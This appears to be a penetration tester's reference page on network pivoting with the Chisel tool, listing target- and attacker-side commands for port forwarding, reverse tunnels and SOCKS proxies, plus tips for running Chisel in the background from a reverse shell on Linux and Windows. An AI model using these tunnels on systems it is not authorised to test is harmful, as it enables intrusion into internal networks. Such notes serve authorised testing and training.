---
description: Pivoting using Chisel
---

# Chisel

## **Requirements** <a href="#bkmrk-usage" id="bkmrk-usage"></a>

Requires a copy of the Chisel binary on both the target and attacker systems.

## **Advantages** <a href="#bkmrk-chisel-advantages" id="bkmrk-chisel-advantages"></a>

* Chisel is a portable binary that can be run on many operating systems
  * Either system can host the chisel server on a chosen TCP port&#x20;
  * Allows for a high amount of flexibility in situations where restrictions on connectivity exist
* No dependencies on SSH daemons/services running on the target
* Supports authenticated proxies to prevent unwanted connections.

## **Individual Port Forwarding** <a href="#bkmrk-individual-port-forw" id="bkmrk-individual-port-forw"></a>

Example: A service on a compromised host is listening on `$RPORT`

1. Run the Chisel server on the target and connect from the attack box
2. Specify the port forward on the client
3. Open a port on attack box and forward traffic to remote port

```bash
# Target Machine
./chisel server --port $SERV_PORT

# Attack Machine
./chisel client $targetIP:$SERV_PORT $LHOST:$LPORT:$RHOST:$RPORT
```

Open `$LPORT` on attack box and port forward to `$RPORT` on target

## **Reverse Individual Port Forwarding** <a href="#bkmrk-reverse-local-port-t" id="bkmrk-reverse-local-port-t"></a>

Example: A service on a compromised host is listening on `$LPORT`

1. Run the Chisel server on the attack box in **reverse mode** and connect from the target
2. Specify the port forward on the target machine
3. Open a port on attack box and forward traffic to remote port

```bash
# Attack Machine
./chisel server --reverse --port $SERV_PORT

# Target Machine
./chisel client $attackIP:$SERV_PORT R:$RPORT:$LHOST:$LPORT
```

Open `$RPORT` on attack box and forward to `$LPORT` on target through reverse connection.

## **Socks Proxy** <a href="#bkmrk-chisel-server-runnin" id="bkmrk-chisel-server-runnin"></a>

### **Server Running on Attack Box** <a href="#bkmrk-chisel-server-runnin" id="bkmrk-chisel-server-runnin"></a>

```bash
# Attack Machine
./chisel server --reverse --port 51234

# Target Machine
./chisel client $AttackIP:51234 R:127.0.0.1:54321:socks
```

Opens port 54321 on attack box as a reverse SOCKS proxy.  Listens for connections from Chisel on this port.

### **Chisel Server Running on Target** <a href="#bkmrk-chisel-server-runnin-0" id="bkmrk-chisel-server-runnin-0"></a>

```bash
# Target Machine
./chisel server --socks5 --port 51234

# Attack Machine
./chisel client $targetIP:51234 54321:socks
```

Open port 54321 on attack machine as a forward SOCKS proxy

### **Forward Dynamic SOCKS Proxy** <a href="#bkmrk-forward-dynamic-sock" id="bkmrk-forward-dynamic-sock"></a>

1. Run the Chisel server on the target box
2. Use the target box as a jump host to reach additional targets routable by the target

The traffic flows forward to the target box, which acts as a transparent SOCKS proxy

```bash
# Target Machine
./chisel server --socks5 --port $SERV_PORT

# Attack Machine
./chisel client $targetIP:$SERV_PORT $LPORT:socks
```

### **Reverse Dynamic SOCKS Proxy** <a href="#bkmrk-reverse-dynamic-sock" id="bkmrk-reverse-dynamic-sock"></a>

1. Run the Chisel server on the attack box in reverse mode
2. Connect to the Chisel server from the target and specify a reverse port forward

The traffic flows through the port on the attack box in reverse to the target box, which acts as a transparent SOCKS proxy

```
# Attack Machine
./chisel server --reverse --port $SERV_PORT

# Target Machine
./chisel client $attackIP:$SERV_PORT R:127.0.0.1:$LPORT:socks
```

## **Reverse Shell Tips** <a href="#bkmrk-reverse-shell-tips" id="bkmrk-reverse-shell-tips"></a>

### **Run Chisel in the Background** <a href="#bkmrk-run-chisel-in-the-ba" id="bkmrk-run-chisel-in-the-ba"></a>

Running `chisel` in the foreground in a reverse shell will render your shell useless.  Background the process in order to continue to use the shell while forwarding traffic.

#### **Linux**

Background a process with '`&`'.  Works for both client and server sides.

```bash
chisel server --port 8080 --reverse &
```

#### **Windows - PowerShell**

**Client Side**

```powershell
# Use the Start-Job cmdlet with a script block
$background = { Start-Process C:\Windows\Temp\chisel.exe -ArgumentList @('client','10.0.0.2:8080','R:127.0.0.1:8800:127.0.0.1:80') }
Start-Job -ScriptBlock $background
```

**Server Side**

Note that in `server` mode, you'll need to make sure your port is allowed through the firewall.

```powershell
# Use the Start-Job cmdlet with a script block
$background = { Start-Process C:\Windows\Temp\chisel.exe -ArgumentList @('server','--port 50001','--socks5') }
Start-Job -ScriptBlock $background
```

## References

* [https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
